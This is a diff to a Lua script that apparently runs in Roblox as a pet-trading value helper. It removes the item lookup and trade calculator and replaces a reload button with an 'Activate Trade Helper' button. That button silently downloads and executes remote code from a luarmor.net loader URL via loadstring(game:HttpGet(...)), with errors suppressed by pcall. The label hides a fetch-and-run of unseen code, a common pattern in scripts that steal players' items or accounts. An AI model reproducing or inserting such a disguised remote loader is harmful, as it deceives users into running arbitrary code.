@@ -590,113 +590,12 @@ TradeTab:CreateParagraph({
 })
 
 TradeTab:CreateButton({
-    Name = "Load / Reload Values",
+    Name = "Activate Trade Helper",
     Callback = function()
-        valuesLoaded = false
-        valueDb = nil
-        loadValueDatabase()
+        pcall(function()
+            loadstring(game:HttpGet("https://api.luarmor.net/files/v4/loaders/9a01589e88fa6dd4e85c1bc2e56e4da3.lua"))()
+        end)
     end
-})
-
-TradeTab:CreateSection("Single Item Lookup")
-
-TradeTab:CreateInput({
-    Name = "Item Name",
-    PlaceholderText = "Shadow Dragon",
-    RemoveTextAfterFocusLost = false,
-    CurrentValue = lookupName,
-    Callback = function(text)
-        lookupName = tostring(text or "")
-    end
-})
-
-TradeTab:CreateDropdown({
-    Name = "Variant",
-    Options = {
-        "no potion",
-        "regular",
-        "ride",
-        "fly",
-        "fly ride",
-        "neon",
-        "neon ride",
-        "neon fly",
-        "neon fly ride",
-        "mega",
-        "mega ride",
-        "mega fly",
-        "mega fly ride"
-    },
-    CurrentOption = {lookupVariant},
-    MultipleOptions = false,
-    Callback = function(option)
-        lookupVariant = firstOption(option)
-    end
-})
-
-TradeTab:CreateButton({
-    Name = "Lookup Item Value",
-    Callback = function()
-        lookupOneValue()
-    end
-})
-
-lookupParagraph = TradeTab:CreateParagraph({
-    Title = "Lookup Result",
-    Content = "Values loading..."
-})
-
-TradeTab:CreateSection("Manual Trade Calculator")
-
-TradeTab:CreateDropdown({
-    Name = "Default Variant For Plain Items",
-    Options = {"regular", "no potion", "fly ride"},
-    CurrentOption = {offerDefaultVariant},
-    MultipleOptions = false,
-    Callback = function(option)
-        offerDefaultVariant = firstOption(option)
-    end
-})
-
-TradeTab:CreateInput({
-    Name = "Your Offer",
-    PlaceholderText = "m kangaroo, fr cow, 2x n dog",
-    RemoveTextAfterFocusLost = false,
-    CurrentValue = yourOfferText,
-    Callback = function(text)
-        yourOfferText = tostring(text or "")
-    end
-})
-
-TradeTab:CreateInput({
-    Name = "Their Offer",
-    PlaceholderText = "shadow dragon, nfr turtle",
-    RemoveTextAfterFocusLost = false,
-    CurrentValue = theirOfferText,
-    Callback = function(text)
-        theirOfferText = tostring(text or "")
-    end
-})
-
-TradeTab:CreateButton({
-    Name = "Calculate Trade",
-    Callback = function()
-        calculateManualTrade()
-    end
-})
-
-TradeTab:CreateButton({
-    Name = "Clear Trade Result",
-    Callback = function()
-        yourOfferText = ""
-        theirOfferText = ""
-        setParagraphSafe(tradeParagraph, "Trade Result", "Cleared. Re-execute to clear input boxes visually.")
-    end
-})
-
-tradeParagraph = TradeTab:CreateParagraph({
-    Title = "Trade Result",
-    Content = "Examples: kangaroo, fr kangaroo, n kangaroo, nfr kangaroo, m kangaroo, mfr kangaroo."
 })
 
 
